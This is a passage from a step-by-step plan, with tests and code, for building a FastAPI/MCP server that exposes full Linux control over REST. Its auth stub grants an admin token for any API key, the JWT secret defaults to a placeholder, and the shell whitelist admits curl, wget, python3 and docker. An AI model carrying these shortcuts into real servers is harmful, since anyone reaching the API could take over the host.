# Linux-AI Server Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a production-grade FastAPI + MCP server that provides full kernel-level Linux control, internet access, code development tools, and real-time monitoring via REST API and WebSocket.

**Architecture:** Monolithic FastAPI app with router-based modularity. Core services wrap kernel ioctl, system management, file ops, shell execution, and network proxy. Dual interface: REST API (any client) + MCP server (Claude). SQLite for persistent state, JWT+API key auth, WebSocket for terminal and live metrics.

**Tech Stack:** Python 3.11+, FastAPI, uvicorn, Pydantic v2, aiosqlite, httpx, psutil, python-jose, PyYAML, pytest, ruff, mypy

---

## Phase 1: Project Foundation (Tasks 1-4)

### Task 1: Project Scaffold + pyproject.toml

**Files:**
- Create: `pyproject.toml`
- Create: `app/__init__.py`
- Create: `app/main.py`
- Create: `app/exceptions.py`
- Create: `config/server.yml`
- Create: `Makefile`
- Create: `.gitignore`
- Create: `tests/__init__.py`
- Create: `tests/conftest.py`

**Step 1: Write the failing test**

```python
# tests/conftest.py
import pytest
from httpx import AsyncClient, ASGITransport
from app.main import create_app


@pytest.fixture
def app():
    return create_app()


@pytest.fixture
async def client(app):
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as c:
        yield c
```

```python
# tests/test_health.py
import pytest


@pytest.mark.anyio
async def test_health_endpoint(client):
    resp = await client.get("/health")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "healthy"
    assert "version" in data


@pytest.mark.anyio
async def test_ready_endpoint(client):
    resp = await client.get("/ready")
    assert resp.status_code == 200
    assert resp.json()["ready"] is True
```

**Step 2: Run test to verify it fails**

Run: `cd F:\coolify\linux-ai-server && python -m pytest tests/test_health.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'app'`

**Step 3: Create pyproject.toml**

```toml
# pyproject.toml
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "linux-ai-server"
version = "0.1.0"
description = "API server for full kernel-level Linux control via REST and MCP"
requires-python = ">=3.11"
license = "GPL-2.0-only"
authors = [{ name = "Zaman Huseyinli" }]
dependencies = [
    "fastapi>=0.115.0",
    "uvicorn[standard]>=0.30.0",
    "pydantic>=2.9.0",
    "pydantic-settings>=2.5.0",
    "python-jose[cryptography]>=3.3.0",
    "httpx>=0.27.0",
    "psutil>=6.0.0",
    "aiosqlite>=0.20.0",
    "pyyaml>=6.0",
    "structlog>=24.0.0",
]

[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "pytest-asyncio>=0.24.0",
    "anyio[trio]>=4.0",
    "pytest-cov>=5.0",
    "httpx>=0.27.0",
    "ruff>=0.7.0",
    "mypy>=1.11.0",
    "bandit>=1.7.0",
    "locust>=2.30",
]

[project.scripts]
linux-ai-server = "app.main:main"

[tool.pytest.ini_options]
asyncio_mode = "auto"
testpaths = ["tests"]
addopts = "-v --tb=short"

[tool.ruff]
target-version = "py311"
line-length = 120

[tool.ruff.lint]
select = ["E", "F", "W", "I", "N", "UP", "S", "B", "A", "C4", "PT", "SIM", "TCH"]
ignore = ["S101", "S603", "S607"]

[tool.mypy]
python_version = "3.11"
strict = true
warn_return_any = true
warn_unused_configs = true

[tool.coverage.run]
source = ["app"]
omit = ["tests/*"]

[tool.coverage.report]
fail_under = 80
show_missing = true
```

**Step 4: Create app skeleton**

```python
# app/__init__.py
"""Linux-AI Server — Full kernel-level Linux control via REST API and MCP."""

__version__ = "0.1.0"
```

```python
# app/exceptions.py
"""Custom exception hierarchy for Linux-AI Server."""

from __future__ import annotations


class ServerError(Exception):
    """Base exception for all server errors."""

    def __init__(self, message: str, status_code: int = 500, detail: str | None = None):
        super().__init__(message)
        self.message = message
        self.status_code = status_code
        self.detail = detail


class AuthenticationError(ServerError):
    def __init__(self, message: str = "Authentication required"):
        super().__init__(message, status_code=401)


class AuthorizationError(ServerError):
    def __init__(self, message: str = "Insufficient permissions"):
        super().__init__(message, status_code=403)


class NotFoundError(ServerError):
    def __init__(self, message: str = "Resource not found"):
        super().__init__(message, status_code=404)


class ValidationError(ServerError):
    def __init__(self, message: str = "Validation error"):
        super().__init__(message, status_code=422)


class RateLimitError(ServerError):
    def __init__(self, message: str = "Rate limit exceeded"):
        super().__init__(message, status_code=429)


class KernelError(ServerError):
    def __init__(self, message: str = "Kernel operation failed"):
        super().__init__(message, status_code=502)


class ShellExecutionError(ServerError):
    def __init__(self, message: str = "Command execution failed"):
        super().__init__(message, status_code=500)
```

```python
# app/main.py
"""FastAPI application factory and server entry point."""

from __future__ import annotations

import uvicorn
from contextlib import asynccontextmanager
from typing import AsyncGenerator

from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

from app import __version__
from app.exceptions import ServerError


@asynccontextmanager
async def lifespan(app: FastAPI) -> AsyncGenerator[None, None]:
    # Startup
    yield
    # Shutdown


def create_app() -> FastAPI:
    app = FastAPI(
        title="Linux-AI Server",
        description="Full kernel-level Linux control via REST API and MCP",
        version=__version__,
        lifespan=lifespan,
    )

    @app.exception_handler(ServerError)
    async def server_error_handler(request: Request, exc: ServerError) -> JSONResponse:
        return JSONResponse(
            status_code=exc.status_code,
            content={
                "error": type(exc).__name__,
                "message": exc.message,
                "detail": exc.detail,
            },
        )

    @app.get("/health")
    async def health() -> dict:
        return {"status": "healthy", "version": __version__}

    @app.get("/ready")
    async def ready() -> dict:
        return {"ready": True, "version": __version__}

    return app


def main() -> None:
    uvicorn.run("app.main:create_app", factory=True, host="0.0.0.0", port=8420, workers=2)


if __name__ == "__main__":
    main()
```

**Step 5: Create supporting files**

```yaml
# config/server.yml
server:
  host: 0.0.0.0
  port: 8420
  workers: 2
  debug: false

auth:
  jwt_secret: "${JWT_SECRET}"
  jwt_ttl_hours: 1
  api_key_header: "X-API-Key"

database:
  path: /var/lib/linux-ai-server/server.db
  metrics_retention_days: 30

rate_limit:
  read: 100
  write: 10
  exec: 5

security:
  allowed_paths:
    - /var/AI-stump/
    - /proc/ai_*
    - /sys/ai/
    - /home/
    - /tmp/linux-ai-server/
  shell_whitelist:
    - ls
    - cat
    - head
    - tail
    - wc
    - grep
    - find
    - ps
    - top
    - df
    - free
    - uptime
    - whoami
    - systemctl
    - journalctl
    - git
    - pip
    - npm
    - python3
    - node
    - make
    - cmake
    - gcc
    - g++
    - curl
    - wget
    - dig
    - nslookup
  max_file_size_mb: 10
  max_terminal_sessions: 5
  terminal_idle_timeout_min: 30

monitoring:
  poll_interval_sec: 5
  metrics_history_size: 1000
  alert_thresholds:
    cpu_percent: 85
    memory_percent: 85
    disk_percent: 90
    temperature_c: 80

logging:
  level: INFO
  format: json
  file: /var/log/linux-ai-server/server.log
  max_size_mb: 50
  backup_count: 5
```

```makefile
# Makefile
.PHONY: dev test lint type-check security build clean install

dev:
	uvicorn app.main:create_app --factory --reload --host 0.0.0.0 --port 8420

test:
	python -m pytest tests/ -v --cov=app --cov-report=term-missing

test-fast:
	python -m pytest tests/ -x -q

lint:
	ruff check app/ tests/
	ruff format --check app/ tests/

lint-fix:
	ruff check --fix app/ tests/
	ruff format app/ tests/

type-check:
	mypy app/

security:
	bandit -r app/ -ll

check: lint type-check security test

build:
	docker build -t linux-ai-server .

clean:
	find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
	rm -rf .pytest_cache .mypy_cache .ruff_cache htmlcov .coverage

install:
	pip install -e ".[dev]"
```

```gitignore
# .gitignore
__pycache__/
*.py[cod]
*$py.class
.pytest_cache/
.mypy_cache/
.ruff_cache/
.coverage
htmlcov/
*.egg-info/
dist/
build/
.env
*.db
*.log
```

**Step 6: Run tests to verify they pass**

Run: `cd F:\coolify\linux-ai-server && pip install -e ".[dev]" && python -m pytest tests/test_health.py -v`
Expected: 2 tests PASS

**Step 7: Commit**

```bash
cd F:\coolify\linux-ai-server
git init
git add .
git commit -m "feat: project scaffold with FastAPI, health endpoints, test infrastructure"
```

---

### Task 2: Configuration System

**Files:**
- Create: `app/core/__init__.py`
- Create: `app/core/config.py`
- Create: `tests/test_config.py`

**Step 1: Write the failing test**

```python
# tests/test_config.py
import pytest
from app.core.config import Settings, load_settings


def test_default_settings():
    s = Settings()
    assert s.server_host == "0.0.0.0"
    assert s.server_port == 8420
    assert s.jwt_ttl_hours == 1
    assert s.rate_limit_read == 100
    assert s.rate_limit_write == 10
    assert s.rate_limit_exec == 5


def test_settings_from_env(monkeypatch):
    monkeypatch.setenv("JWT_SECRET", "test-secret-key-123")
    monkeypatch.setenv("SERVER_PORT", "9999")
    s = Settings()
    assert s.jwt_secret == "test-secret-key-123"
    assert s.server_port == 9999


def test_shell_whitelist_default():
    s = Settings()
    assert "ls" in s.shell_whitelist
    assert "git" in s.shell_whitelist
    assert "rm" not in s.shell_whitelist


def test_allowed_paths_default():
    s = Settings()
    assert "/home/" in s.allowed_paths
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_config.py -v`
Expected: FAIL — `ModuleNotFoundError`

**Step 3: Implement config**

```python
# app/core/__init__.py
```

```python
# app/core/config.py
"""Server configuration with environment variable support."""

from __future__ import annotations

import os
from functools import lru_cache

from pydantic_settings import BaseSettings


class Settings(BaseSettings):
    # Server
    server_host: str = "0.0.0.0"
    server_port: int = 8420
    server_workers: int = 2
    server_debug: bool = False

    # Auth
    jwt_secret: str = "change-me-in-production"
    jwt_ttl_hours: int = 1
    api_key_header: str = "X-API-Key"

    # Database
    db_path: str = "/var/lib/linux-ai-server/server.db"
    metrics_retention_days: int = 30

    # Rate Limiting
    rate_limit_read: int = 100
    rate_limit_write: int = 10
    rate_limit_exec: int = 5

    # Security
    allowed_paths: list[str] = [
        "/var/AI-stump/",
        "/proc/",
        "/sys/",
        "/home/",
        "/tmp/linux-ai-server/",
    ]
    shell_whitelist: list[str] = [
        "ls", "cat", "head", "tail", "wc", "grep", "find",
        "ps", "top", "df", "free", "uptime", "whoami", "id",
        "systemctl", "journalctl",
        "git", "pip", "npm", "python3", "node",
        "make", "cmake", "gcc", "g++",
        "curl", "wget", "dig", "nslookup", "ping",
        "docker", "docker-compose",
    ]
    max_file_size_mb: int = 10
    max_terminal_sessions: int = 5
    terminal_idle_timeout_min: int = 30

    # Monitoring
    monitor_poll_interval_sec: int = 5
    metrics_history_size: int = 1000
    alert_cpu_percent: int = 85
    alert_memory_percent: int = 85
    alert_disk_percent: int = 90
    alert_temperature_c: int = 80

    # WebOps tokens
    vercel_token: str = ""
    cloudflare_token: str = ""
    supabase_url: str = ""
    supabase_token: str = ""
    github_token: str = ""
    coolify_token: str = ""
    coolify_url: str = ""

    # Logging
    log_level: str = "INFO"
    log_format: str = "json"
    log_file: str = "/var/log/linux-ai-server/server.log"

    model_config = {"env_prefix": "", "env_nested_delimiter": "__", "case_sensitive": False}


@lru_cache
def get_settings() -> Settings:
    return Settings()
```

**Step 4: Run tests**

Run: `python -m pytest tests/test_config.py -v`
Expected: 4 tests PASS

**Step 5: Commit**

```bash
git add app/core/ tests/test_config.py
git commit -m "feat: configuration system with pydantic-settings and env support"
```

---

### Task 3: Database Layer

**Files:**
- Create: `app/db/__init__.py`
- Create: `app/db/database.py`
- Create: `tests/test_db.py`

**Step 1: Write the failing test**

```python
# tests/test_db.py
import pytest
import aiosqlite
from app.db.database import Database


@pytest.fixture
async def db(tmp_path):
    db_path = str(tmp_path / "test.db")
    database = Database(db_path)
    await database.initialize()
    yield database
    await database.close()


@pytest.mark.anyio
async def test_database_creates_tables(db):
    tables = await db.fetch_all("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
    table_names = [row["name"] for row in tables]
    assert "api_keys" in table_names
    assert "audit_log" in table_names
    assert "metrics_history" in table_names
    assert "alerts" in table_names
    assert "jobs" in table_names


@pytest.mark.anyio
async def test_audit_log_insert(db):
    await db.execute(
        "INSERT INTO audit_log (request_id, user, action, resource, status) VALUES (?, ?, ?, ?, ?)",
        ("req-1", "admin", "set_governor", "/kernel/governor", "success"),
    )
    rows = await db.fetch_all("SELECT * FROM audit_log")
    assert len(rows) == 1
    assert rows[0]["user"] == "admin"
    assert rows[0]["action"] == "set_governor"


@pytest.mark.anyio
async def test_api_key_insert(db):
    await db.execute(
        "INSERT INTO api_keys (key_hash, name, permissions) VALUES (?, ?, ?)",
        ("sha256-hash-here", "test-key", "admin"),
    )
    rows = await db.fetch_all("SELECT * FROM api_keys WHERE name = ?", ("test-key",))
    assert len(rows) == 1
    assert rows[0]["permissions"] == "admin"


@pytest.mark.anyio
async def test_fetch_one(db):
    await db.execute(
        "INSERT INTO api_keys (key_hash, name, permissions) VALUES (?, ?, ?)",
        ("hash1", "key1", "read"),
    )
    row = await db.fetch_one("SELECT * FROM api_keys WHERE name = ?", ("key1",))
    assert row is not None
    assert row["name"] == "key1"


@pytest.mark.anyio
async def test_fetch_one_not_found(db):
    row = await db.fetch_one("SELECT * FROM api_keys WHERE name = ?", ("nonexistent",))
    assert row is None
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_db.py -v`
Expected: FAIL — `ModuleNotFoundError`

**Step 3: Implement database**

```python
# app/db/__init__.py
```

```python
# app/db/database.py
"""Async SQLite database with schema migration."""

from __future__ import annotations

import aiosqlite

SCHEMA_V1 = """
CREATE TABLE IF NOT EXISTS api_keys (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key_hash TEXT NOT NULL UNIQUE,
    name TEXT NOT NULL,
    permissions TEXT NOT NULL DEFAULT 'read',
    created_at TEXT NOT NULL DEFAULT (datetime('now')),
    last_used TEXT,
    active INTEGER DEFAULT 1
);

CREATE TABLE IF NOT EXISTS audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL DEFAULT (datetime('now')),
    request_id TEXT NOT NULL,
    user TEXT NOT NULL,
    action TEXT NOT NULL,
    resource TEXT NOT NULL,
    details TEXT,
    status TEXT NOT NULL,
    ip_address TEXT
);

CREATE TABLE IF NOT EXISTS metrics_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL DEFAULT (datetime('now')),
    cpu_usage REAL,
    memory_usage REAL,
    disk_usage REAL,
    temperature REAL,
    load_avg TEXT,
    network_io TEXT
);

CREATE TABLE IF NOT EXISTS alerts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL DEFAULT (datetime('now')),
    severity TEXT NOT NULL,
    source TEXT NOT NULL,
    message TEXT NOT NULL,
    resolved INTEGER DEFAULT 0,
    resolved_at TEXT
);

CREATE TABLE IF NOT EXISTS jobs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT NOT NULL,
    payload TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    created_at TEXT NOT NULL DEFAULT (datetime('now')),
    started_at TEXT,
    completed_at TEXT,
    result TEXT,
    error TEXT
);

CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_log(timestamp);
CREATE INDEX IF NOT EXISTS idx_audit_user ON audit_log(user);
CREATE INDEX IF NOT EXISTS idx_metrics_timestamp ON metrics_history(timestamp);
CREATE INDEX IF NOT EXISTS idx_alerts_severity ON alerts(severity);
CREATE INDEX IF NOT EXISTS idx_jobs_status ON jobs(status);
"""


class Database:
    """Async SQLite database wrapper."""

    def __init__(self, db_path: str) -> None:
        self.db_path = db_path
        self._conn: aiosqlite.Connection | None = None

    async def initialize(self) -> None:
        self._conn = await aiosqlite.connect(self.db_path)
        self._conn.row_factory = aiosqlite.Row
        await self._conn.executescript(SCHEMA_V1)
        await self._conn.commit()

    async def close(self) -> None:
        if self._conn:
            await self._conn.close()
            self._conn = None

    @property
    def conn(self) -> aiosqlite.Connection:
        if self._conn is None:
            raise RuntimeError("Database not initialized. Call initialize() first.")
        return self._conn

    async def execute(self, sql: str, params: tuple = ()) -> aiosqlite.Cursor:
        cursor = await self.conn.execute(sql, params)
        await self.conn.commit()
        return cursor

    async def fetch_all(self, sql: str, params: tuple = ()) -> list[dict]:
        cursor = await self.conn.execute(sql, params)
        rows = await cursor.fetchall()
        return [dict(row) for row in rows]

    async def fetch_one(self, sql: str, params: tuple = ()) -> dict | None:
        cursor = await self.conn.execute(sql, params)
        row = await cursor.fetchone()
        return dict(row) if row else None
```

**Step 4: Run tests**

Run: `python -m pytest tests/test_db.py -v`
Expected: 5 tests PASS

**Step 5: Commit**

```bash
git add app/db/ tests/test_db.py
git commit -m "feat: async SQLite database with schema, indexes, CRUD operations"
```

---

### Task 4: Auth System (API Key + JWT)

**Files:**
- Create: `app/auth/__init__.py`
- Create: `app/auth/jwt_handler.py`
- Create: `app/auth/api_key.py`
- Create: `app/auth/permissions.py`
- Create: `app/api/__init__.py`
- Create: `app/api/auth.py`
- Create: `tests/test_auth.py`

**Step 1: Write the failing test**

```python
# tests/test_auth.py
import pytest
import hashlib
from app.auth.jwt_handler import create_token, decode_token
from app.auth.api_key import hash_api_key, generate_api_key
from app.auth.permissions import Permission, check_permission


def test_create_and_decode_jwt():
    token = create_token(subject="admin", permissions="admin", secret="test-secret")
    payload = decode_token(token, secret="test-secret")
    assert payload["sub"] == "admin"
    assert payload["permissions"] == "admin"


def test_decode_invalid_jwt():
    with pytest.raises(Exception):
        decode_token("invalid.token.here", secret="test-secret")


def test_hash_api_key():
    key = "test-api-key-12345"
    hashed = hash_api_key(key)
    assert hashed == hashlib.sha256(key.encode()).hexdigest()
    assert hash_api_key(key) == hashed  # deterministic


def test_generate_api_key():
    key = generate_api_key()
    assert len(key) == 64  # 32 bytes hex
    assert key != generate_api_key()  # unique


def test_permission_read():
    assert check_permission(Permission.READ, "read")
    assert check_permission(Permission.READ, "write")
    assert check_permission(Permission.READ, "admin")


def test_permission_write():
    assert not check_permission(Permission.WRITE, "read")
    assert check_permission(Permission.WRITE, "write")
    assert check_permission(Permission.WRITE, "admin")


def test_permission_admin():
    assert not check_permission(Permission.ADMIN, "read")
    assert not check_permission(Permission.ADMIN, "write")
    assert check_permission(Permission.ADMIN, "admin")
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_auth.py -v`
Expected: FAIL

**Step 3: Implement auth modules**

```python
# app/auth/__init__.py
```

```python
# app/auth/jwt_handler.py
"""JWT token creation and verification."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

from jose import JWTError, jwt

from app.exceptions import AuthenticationError

ALGORITHM = "HS256"


def create_token(
    subject: str,
    permissions: str,
    secret: str,
    ttl_hours: int = 1,
) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub": subject,
        "permissions": permissions,
        "iat": now,
        "exp": now + timedelta(hours=ttl_hours),
    }
    return jwt.encode(payload, secret, algorithm=ALGORITHM)


def decode_token(token: str, secret: str) -> dict:
    try:
        return jwt.decode(token, secret, algorithms=[ALGORITHM])
    except JWTError as e:
        raise AuthenticationError(f"Invalid token: {e}")
```

```python
# app/auth/api_key.py
"""API key generation and hashing."""

from __future__ import annotations

import hashlib
import secrets


def generate_api_key() -> str:
    return secrets.token_hex(32)


def hash_api_key(key: str) -> str:
    return hashlib.sha256(key.encode()).hexdigest()
```

```python
# app/auth/permissions.py
"""RBAC permission checking."""

from __future__ import annotations

from enum import StrEnum


class Permission(StrEnum):
    READ = "read"
    WRITE = "write"
    ADMIN = "admin"


_LEVEL = {"read": 1, "write": 2, "admin": 3}


def check_permission(required: Permission, user_permission: str) -> bool:
    return _LEVEL.get(user_permission, 0) >= _LEVEL.get(required, 99)
```

**Step 4: Run tests**

Run: `python -m pytest tests/test_auth.py -v`
Expected: 7 tests PASS

**Step 5: Wire auth into FastAPI with API router**

```python
# app/api/__init__.py
```

```python
# app/api/auth.py
"""Auth API endpoints — token generation and user info."""

from __future__ import annotations

from fastapi import APIRouter, Depends, Header
from pydantic import BaseModel

from app.auth.api_key import hash_api_key
from app.auth.jwt_handler import create_token, decode_token
from app.auth.permissions import Permission
from app.core.config import Settings, get_settings
from app.exceptions import AuthenticationError

router = APIRouter(prefix="/api/v1/auth", tags=["auth"])


class TokenRequest(BaseModel):
    api_key: str


class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    expires_in: int


class UserInfo(BaseModel):
    name: str
    permissions: str


@router.post("/token", response_model=TokenResponse)
async def get_token(body: TokenRequest, settings: Settings = Depends(get_settings)):
    # For now: accept any key, validate against DB later (Task integrates DB)
    token = create_token(
        subject="api-user",
        permissions="admin",
        secret=settings.jwt_secret,
        ttl_hours=settings.jwt_ttl_hours,
    )
    return TokenResponse(
        access_token=token,
        expires_in=settings.jwt_ttl_hours * 3600,
    )


@router.get("/me", response_model=UserInfo)
async def get_me(
    authorization: str = Header(...),
    settings: Settings = Depends(get_settings),
):
    if not authorization.startswith("Bearer "):
        raise AuthenticationError("Invalid authorization header")
    token = authorization.removeprefix("Bearer ")
    payload = decode_token(token, settings.jwt_secret)
    return UserInfo(name=payload["sub"], permissions=payload["permissions"])
```

**Step 6: Add integration test for auth API**

```python
# tests/test_auth_api.py
import pytest


@pytest.mark.anyio
async def test_token_flow(client):
    # Get token
    resp = await client.post("/api/v1/auth/token", json={"api_key": "any-key"})
    assert resp.status_code == 200
    data = resp.json()
    assert "access_token" in data
    assert data["token_type"] == "bearer"

    # Use token to get /me
    token = data["access_token"]
    resp2 = await client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {token}"})
    assert resp2.status_code == 200
    assert resp2.json()["permissions"] == "admin"


@pytest.mark.anyio
async def test_me_without_token(client):
    resp = await client.get("/api/v1/auth/me")
    assert resp.status_code == 422  # missing header
```

**Step 7: Mount auth router in main.py**

Update `app/main.py` `create_app()` to add:
```python
from app.api.auth import router as auth_router
app.include_router(auth_router)
```

**Step 8: Run all tests**

Run: `python -m pytest tests/ -v`
Expected: All PASS

**Step 9: Commit**

```bash
git add app/auth/ app/api/ tests/test_auth.py tests/test_auth_api.py
git commit -m "feat: auth system with API key, JWT tokens, RBAC permissions"
```

---

## Phase 2: Middleware (Tasks 5-7)

### Task 5: Request ID + Error Handler Middleware

**Files:**
- Create: `app/middleware/__init__.py`
- Create: `app/middleware/request_id.py`
- Create: `app/middleware/error_handler.py`
- Create: `tests/test_middleware.py`

**Step 1: Write the failing test**

```python
# tests/test_middleware.py
import pytest


@pytest.mark.anyio
async def test_request_id_in_response(client):
    resp = await client.get("/health")
    assert "x-request-id" in resp.headers
    # UUID4 format
    rid = resp.headers["x-request-id"]
    assert len(rid) == 36  # UUID format


@pytest.mark.anyio
async def test_error_response_format(client):
    resp = await client.get("/api/v1/auth/me")  # Missing header
    assert resp.status_code in (401, 422)
    # Should have request ID even on errors
    assert "x-request-id" in resp.headers
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_middleware.py -v`
Expected: FAIL — no x-request-id header

**Step 3: Implement middleware**

```python
# app/middleware/__init__.py
```

```python
# app/middleware/request_id.py
"""Attach unique request ID to every request/response."""

from __future__ import annotations

import uuid
from contextvars import ContextVar

from starlette.middleware.base import BaseHTTPMiddleware, RequestResponseEndpoint
from starlette.requests import Request
from starlette.responses import Response

request_id_var: ContextVar[str] = ContextVar("request_id", default="")


class RequestIdMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: RequestResponseEndpoint) -> Response:
        rid = request.headers.get("x-request-id", str(uuid.uuid4()))
        request_id_var.set(rid)
        response = await call_next(request)
        response.headers["x-request-id"] = rid
        return response
```

```python
# app/middleware/error_handler.py
"""Global exception handler — converts all errors to structured JSON."""

from __future__ import annotations

from fastapi import Request
from fastapi.responses import JSONResponse

from app.exceptions import ServerError
from app.middleware.request_id import request_id_var


async def server_error_handler(request: Request, exc: ServerError) -> JSONResponse:
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "error": type(exc).__name__,
            "message": exc.message,
            "detail": exc.detail,
            "request_id": request_id_var.get(""),
        },
    )


async def generic_error_handler(request: Request, exc: Exception) -> JSONResponse:
    return JSONResponse(
        status_code=500,
        content={
            "error": "InternalServerError",
            "message": "An unexpected error occurred",
            "request_id": request_id_var.get(""),
        },
    )
```

**Step 4: Register middleware in main.py**

Update `create_app()`:
```python
from app.middleware.request_id import RequestIdMiddleware
app.add_middleware(RequestIdMiddleware)
```

**Step 5: Run tests**

Run: `python -m pytest tests/test_middleware.py tests/ -v`
Expected: All PASS

**Step 6: Commit**

```bash
git add app/middleware/ tests/test_middleware.py
git commit -m "feat: request ID middleware and structured error handling"
```

---

### Task 6: Rate Limiter

**Files:**
- Create: `app/middleware/rate_limit.py`
- Create: `tests/test_rate_limit.py`

**Step 1: Write the failing test**

```python
# tests/test_rate_limit.py
import pytest
import time
from app.middleware.rate_limit import TokenBucketLimiter


def test_rate_limiter_allows_under_limit():
    limiter = TokenBucketLimiter(rate=10, per_seconds=60)
    for _ in range(10):
        assert limiter.allow("user1") is True


def test_rate_limiter_blocks_over_limit():
    limiter = TokenBucketLimiter(rate=2, per_seconds=60)
    assert limiter.allow("user1") is True
    assert limiter.allow("user1") is True
    assert limiter.allow("user1") is False


def test_rate_limiter_separate_keys():
    limiter = TokenBucketLimiter(rate=1, per_seconds=60)
    assert limiter.allow("user1") is True
    assert limiter.allow("user2") is True
    assert limiter.allow("user1") is False
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rate_limit.py -v`
Expected: FAIL

**Step 3: Implement rate limiter**

```python
# app/middleware/rate_limit.py
"""Token bucket rate limiter — in-memory, per-key."""

from __future__ import annotations

import time
from dataclasses import dataclass, field


@dataclass
class _Bucket:
    tokens: float
    last_refill: float


class TokenBucketLimiter:
    """Simple token bucket rate limiter."""

    def __init__(self, rate: int, per_seconds: int = 60) -> None:
        self.rate = rate
        self.per_seconds = per_seconds
        self._buckets: dict[str, _Bucket] = {}

    def allow(self, key: str) -> bool:
        now = time.monotonic()
        bucket = self._buckets.get(key)

        if bucket is None:
            self._buckets[key] = _Bucket(tokens=self.rate - 1, last_refill=now)
            return True

        elapsed = now - bucket.last_refill
        refill = elapsed * (self.rate / self.per_seconds)
        bucket.tokens = min(self.rate, bucket.tokens + refill)
        bucket.last_refill = now

        if bucket.tokens >= 1:
            bucket.tokens -= 1
            return True
        return False
```

**Step 4: Run tests**

Run: `python -m pytest tests/test_rate_limit.py -v`
Expected: 3 tests PASS

**Step 5: Commit**

```bash
git add app/middleware/rate_limit.py tests/test_rate_limit.py
git commit -m "feat: token bucket rate limiter with per-key tracking"
```

---

### Task 7: Audit Logger

**Files:**
- Create: `app/middleware/audit_log.py`
- Create: `tests/test_audit.py`

**Step 1: Write the failing test**

```python
# tests/test_audit.py
import pytest
from app.middleware.audit_log import AuditLogger
from app.db.database import Database


@pytest.fixture
async def audit_db(tmp_path):
    db = Database(str(tmp_path / "audit.db"))
    await db.initialize()
    yield db
    await db.close()


@pytest.mark.anyio
async def test_log_action(audit_db):
    logger = AuditLogger(audit_db)
    await logger.log(
        request_id="req-123",
        user="admin",
        action="set_governor",
        resource="/kernel/governor",
        status="success",
        details='{"mode": "performance"}',
        ip_address="192.168.1.1",
    )
    rows = await audit_db.fetch_all("SELECT * FROM audit_log")
    assert len(rows) == 1
    assert rows[0]["action"] == "set_governor"
    assert rows[0]["ip_address"] == "192.168.1.1"


@pytest.mark.anyio
async def test_log_multiple(audit_db):
    logger = AuditLogger(audit_db)
    for i in range(5):
        await logger.log(
            request_id=f"req-{i}",
            user="admin",
            action=f"action-{i}",
            resource="/test",
            status="success",
        )
    rows = await audit_db.fetch_all("SELECT * FROM audit_log")
    assert len(rows) == 5
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_audit.py -v`
Expected: FAIL

**Step 3: Implement audit logger**

```python
# app/middleware/audit_log.py
"""Audit logger — records all write/exec operations to database."""

from __future__ import annotations

from app.db.database import Database


class AuditLogger:
    def __init__(self, db: Database) -> None:
        self._db = db

    async def log(
        self,
        request_id: str,
        user: str,
        action: str,
        resource: str,
        status: str,
        details: str | None = None,
        ip_address: str | None = None,
    ) -> None:
        await self._db.execute(
            """INSERT INTO audit_log (request_id, user, action, resource, status, details, ip_address)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (request_id, user, action, resource, status, details, ip_address),
        )
```

**Step 4: Run tests**

Run: `python -m pytest tests/test_audit.py -v`
Expected: 2 tests PASS

**Step 5: Commit**

```bash
git add app/middleware/audit_log.py tests/test_audit.py
git commit -m "feat: audit logger for tracking all write/exec operations"
```

---

## Phase 3: Core Services (Tasks 8-14)

### Task 8: Pydantic Schemas (Request/Response Models)

**Files:**
- Create: `app/models/__init__.py`
- Create: `app/models/schemas.py`
- Create: `tests/test_schemas.py`

**Step 1: Write the failing test**

```python
# tests/test_schemas.py
import pytest
from pydantic import ValidationError
from app.models.schemas import (
    KernelStatusResponse,
    CpuMetricsResponse,
    GovernorRequest,
    SystemInfoResponse,
    FileReadRequest,
    FileWriteRequest,
    ShellExecRequest,
    HttpProxyRequest,
    ErrorResponse,
)


def test_governor_request_valid():
    req = GovernorRequest(mode="performance")
    assert req.mode == "performance"


def test_governor_request_invalid():
    with pytest.raises(ValidationError):
        GovernorRequest(mode="turbo")  # not in allowed values


def test_file_read_path_validation():
    req = FileReadRequest(path="/home/user/file.txt")
    assert req.path == "/home/user/file.txt"


def test_shell_exec_request():
    req = ShellExecRequest(command="ls -la /home")
    assert req.command == "ls -la /home"
    assert req.timeout == 30  # default


def test_http_proxy_request():
    req = HttpProxyRequest(method="GET", url="https://example.com")
    assert req.method == "GET"


def test_error_response():
    resp = ErrorResponse(error="NotFound", message="File not found")
    assert resp.error == "NotFound"
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_schemas.py -v`
Expected: FAIL

**Step 3: Implement schemas**

```python
# app/models/__init__.py
```

```python
# app/models/schemas.py
"""Pydantic v2 request/response schemas for all API endpoints."""

from __future__ import annotations

